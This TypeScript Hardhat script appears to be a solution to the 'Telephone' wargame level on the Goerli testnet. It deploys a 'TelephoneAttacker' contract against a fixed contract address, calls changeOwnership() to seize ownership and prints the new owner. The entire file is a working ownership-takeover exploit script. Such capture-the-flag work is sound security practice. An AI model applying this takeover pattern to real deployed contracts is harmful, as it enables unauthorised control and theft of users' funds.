import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Telephone"
const CONTRACT_ADDRESS = "0xbDD33Ad6337AA6bd4dDA7040165730d548F9D4d1"
const CONTRACT_NAME_ATTACKER = "TelephoneAttacker"

async function main() {
    let tx: TransactionResponse

    const factory = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = factory.attach(CONTRACT_ADDRESS)

    const attackerFactory = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const attackerContract = await attackerFactory.connect(attacker).deploy(CONTRACT_ADDRESS)
    await attackerContract.deployed()

    tx = await attackerContract.connect(attacker).changeOwnership()
    await tx.wait()

    console.log("Telephone: claimed ownership of the contract");
    console.log(await contract.owner())
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });